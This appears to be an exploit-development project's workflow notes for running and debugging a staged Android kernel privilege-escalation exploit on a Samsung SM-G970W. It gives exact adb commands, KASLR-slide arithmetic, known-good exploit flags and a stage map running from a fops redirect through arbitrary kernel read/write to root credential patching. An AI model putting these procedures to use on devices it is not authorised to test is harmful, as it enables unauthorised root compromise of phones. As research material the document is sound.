# DEBUG_WORKFLOW.md — on-device debug loop (fast, isolated)

The way we debug the exploit on the SM-G970W. Key property: **each step is one
command**, so when the kernel panics/reboots you know exactly which command did it,
and the device recovers quickly by itself (watchdog) so the loop is fast.

## Principles

1. **One adb command per step.** Do not chain commands (`;`, `&&`, `&`) or
   background with `nohup … &`. A single command = a single attributable effect.
2. **The exploit is one command.** Launch it in the *harness* background
   (`background=true`) rather than with a device-side `&`; its stdout is the log.
3. **After any wedge/reboot, re-establish state** before the next step: wait for
   the device, re-check `boot_id`, re-probe the slide.
4. **Settle before running.** Do not run the exploit right after boot (busier =
   higher wedge rate). `slideprobe` (~40 s) doubles as settling time.

## The loop

1. **Device up?** `adb devices` (and `getprop sys.boot_completed`).
   If absent: `adb wait-for-device`.
2. **Slide (per boot):** `timeout 70 /data/local/tmp/slideprobe` → take the `IP`
   line ending in `…bd4`; `slide = (IP_low32 − 0x08000000) − 0x3bd4`.
3. **Refresh binaries (only if rebuilt):**
   `adb push glXX_a64 /data/local/tmp/glXX`, then `adb shell chmod 755 …`.
   For UMH: also `adb push glXX_dnroot_a64 /data/local/tmp/dnroot` + chmod.
4. **Run ONE stage** (single command, harness background):
   ```
   adb shell "env SSOPT_EMPTY=1 SSOPT_FAKE_TASK=1 SSOPT_OWNER0=0 SSOPT_HOLD=0 \
     PSELECT_ROUTE_DELAY_USEC=0 ROUTE_SETSOCKOPT=1 FORCE_REDIRECT=1 \
     SLIDE=0x<slide> timeout 150 /data/local/tmp/glXX --stop-after=<stage> --log=info"
   ```
   `<stage>` = `verify` (walk+redirect) / `umh` / `cred` / `full`.
5. **Read the result** = the run's stdout. The **last line** tells you where it
   died (see map below).
6. **On wedge** (adb drops, device unresponsive): try `adb reboot` (may not take
   while livelocked); otherwise wait for the watchdog; then `adb wait-for-device`,
   check `boot_id` (changes on reboot), re-probe slide, continue.
7. **Record** any working config in `docs/RUN_CONFIG.md`.

## Last-line → stage map

| last line seen | meaning |
|---|---|
| `ssopt pre paint …` (no `post paint`) | wedged in the walk/paint (2.12–2.14) |
| `ssopt post paint … walked=1` | walk returned |
| `cfi fops_before ret=8 value=… want=…` (equal) | fops redirect installed |
| `physrw: configfs-only mode` | arbitrary kernel R/W live |
| `umh: result wake=… complete=… retval=…` | UMH: `0` = ok, `-126` = `-ENOKEY` (exec of a `/data` binary blocked) |
| `root cred patched …` | cred path reached |

`consumer: walk begin` with no `walk end` only appears with `--log=debug` (that
log is timing-sensitive and is OFF by default — **do not use `--log=debug` for
normal runs**: the added `pr_info+fsync` widens the clobber window and wedges).

## Known-good flags (see RUN_CONFIG.md for the 5/5 evidence)

```
SSOPT_EMPTY=1 SSOPT_FAKE_TASK=1 SSOPT_OWNER0=0 SSOPT_HOLD=0 \
PSELECT_ROUTE_DELAY_USEC=0 ROUTE_SETSOCKOPT=1 FORCE_REDIRECT=1 --log=info
```

## Options while a run is live

- **Inspect the live gadget** without re-winning the walk: add `--shell`
  (`glshell`): results go to `/data/local/tmp/gl.out`, commands are read from
  `/data/local/tmp/gl.cmd` (`peek/read/write/quit`).
- **If a process is spinning and adb is still alive**, `adb shell kill -9 <pid>`
  is worth a try, but a kernel livelock usually cannot be killed and the watchdog
  reboots the device.

## Wedge diagnostics (if needed)

`top -n 1 -b` → `%sys` climbing = kernel spin. The watchdog dump
(`/data/log/dumpstate_lastkmsg_*.gz`, pull + scan for `glXX` / `rcu … stall` /
`Call trace`) gives the exact function — e.g. `rt_mutex_adjust_prio_chain+0x1dc`
(the `[5]` trylock-fail retry loop).
